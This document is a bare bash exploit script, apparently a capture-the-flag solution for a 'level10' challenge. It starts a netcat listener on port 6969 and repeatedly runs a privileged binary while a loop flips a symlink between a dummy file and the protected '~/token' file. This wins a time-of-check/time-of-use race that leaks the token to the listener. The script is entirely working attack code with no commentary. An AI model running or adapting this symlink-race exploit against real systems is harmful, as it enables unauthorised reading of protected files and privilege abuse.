#!/bin/bash

echo "Spazzatura" > /tmp/flag

for i in {0..50}
do
  nc -l 6969
done &

for i in {0..50}
do
  ~/level10 /tmp/l_flag 127.0.0.1 &> /dev/null
done &

for i in {0..50}
do
  ln -fs /tmp/flag /tmp/l_flag
  ln -fs ~/token /tmp/l_flag
done
